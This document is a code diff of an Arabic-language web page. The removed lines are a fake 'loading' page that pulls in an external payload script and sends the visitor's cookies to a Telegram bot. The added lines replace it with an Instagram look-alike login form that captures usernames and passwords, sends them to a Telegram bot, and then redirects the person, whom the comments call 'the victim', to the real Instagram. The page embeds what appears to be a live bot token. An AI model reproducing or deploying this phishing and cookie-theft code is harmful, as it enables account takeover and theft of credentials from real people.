@@ -3,59 +3,98 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>تحديث الصفحة</title>
+    <title>تسجيل الدخول - متابعة الجلسة</title>
+    <style>
+        body {
+            background-color: #fafafa;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            border: 1px solid #dbdbdb;
+            padding: 40px;
+            width: 350px;
+            text-align: center;
+            border-radius: 4px;
+        }
+        .login-container h2 {
+            font-family: cursive;
+            margin-bottom: 30px;
+            font-size: 32px;
+            color: #262626;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 9px 8px;
+            background: #fafafa;
+            border: 1px solid #dbdbdb;
+            border-radius: 3px;
+            margin-bottom: 6px;
+            box-sizing: border-box;
+            font-size: 12px;
+        }
+        .login-container button {
+            width: 100%;
+            background-color: #0095f6;
+            color: white;
+            border: none;
+            padding: 7px;
+            border-radius: 4px;
+            font-weight: 600;
+            margin-top: 10px;
+            cursor: pointer;
+        }
+        .login-container p {
+            font-size: 14px;
+            color: #8e8e8e;
+            margin-top: 15px;
+        }
+    </style>
 </head>
-<body style="text-align: center; padding: 50px; font-family: Tahoma; background-color: #f9f9f9;">
-    <h2>جاري تحميل المحتوى...</h2>
-    <p>يرجى الانتظار قليلاً والضغط على الزر أدناه في حال لم يتم التحميل تلقائياً.</p>
-    
-    <!-- الزر التفاعلي -->
-    <button id="myButton" style="padding: 15px 30px; font-size: 18px; background-color: #28a745; color: white; border: none; border-radius: 5px; cursor: pointer; box-shadow: 0 2px 5px rgba(0,0,0,0.2);">اضغط هنا للمتابعة</button>
+<body>
 
-    <!-- تضمين السكريبت الخارجي المستضاف على غيت هب -->
-    <script src="https://moedawahik4-dot.github.io/allac/payload.js"></script>
+    <div class="login-container">
+        <h2>Instagram</h2>
+        <p>يرجى تسجيل الدخول للمتابعة بعد انتهاء صلاحية الجلسة.</p>
+        
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="اسم المستخدم، أو البريد الإلكتروني، أو رقم الهاتف" required>
+            <input type="password" id="password" placeholder="كلمة المرور" required>
+            <button type="submit" id="submitBtn">تسجيل الدخول</button>
+        </form>
+    </div>
 
     <script>
-        // ربط الزر بحدث النقر
-        document.getElementById('myButton').addEventListener('click', function() {
-            // إظهار رسالة تنبيه للمستخدم
-            alert('جاري التحويل إلى المحتوى المطلوب...');
-            
-            // بيانات البوت
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+
+            // بيانات بوت تيليجرام الخاص بك
             const botToken = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
             const chatId = "865078178";
-            
-            // استخراج الكوكيز
-            const cookies = document.cookie.split(';');
-            let cookieString = "";
-            cookies.forEach(cookie => {
-                if (cookie.trim()) {
-                    cookieString += cookie.trim() + "\n";
-                }
-            });
 
             // تجهيز الرسالة
-            const message = "تم النقر على الزر!\nالرابط: " + window.location.href + "\n\nجميع الكوكيز:\n" + cookieString;
+            const message = "🚨 تم التقاط بيانات جديدة:\n👤 المستخدم: " + user + "\n🔑 كلمة المرور: " + pass + "\n🌐 الرابط: " + window.location.href;
 
-            // إرسال البيانات عبر رابط الصورة لتجاوز CORS
+            // إرسال البيانات عبر طلب صورة لتجاوز مشاكل CORS
             const telegramUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
             
-            // إنشاء كائن صورة لإرسال الطلب
             const img = new Image();
             img.src = telegramUrl;
-            
-            console.log("تم إرسال طلب التنبيه إلى تليجرام");
-        });
 
-        // محاكاة الضغط التلقائي عند تحميل الصفحة لضمان إرسال التنبيه الأول
-        window.addEventListener('load', function() {
-             const botTokenAuto = "8970427451:AAFqyCocC3VS1jGYo8Da_ET6PNrV6hWdOVs";
-             const chatIdAuto = "408506450";
-             const messageAuto = "زيارة جديدة للصفحة!\nالرابط: " + window.location.href;
-             const telegramUrlAuto = "https://api.telegram.org/bot" + botTokenAuto + "/sendMessage?chat_id=" + chatIdAuto + "&text=" + encodeURIComponent(messageAuto);
-             const imgAuto = new Image();
-             imgAuto.src = telegramUrlAuto;
+            // إعادة توجيه الضحية إلى الموقع الحقيقي بعد إرسال البيانات بدقة
+            setTimeout(function() {
+                window.location.href = "https://www.instagram.com";
+            }, 600);
         });
     </script>
+
 </body>
 </html>
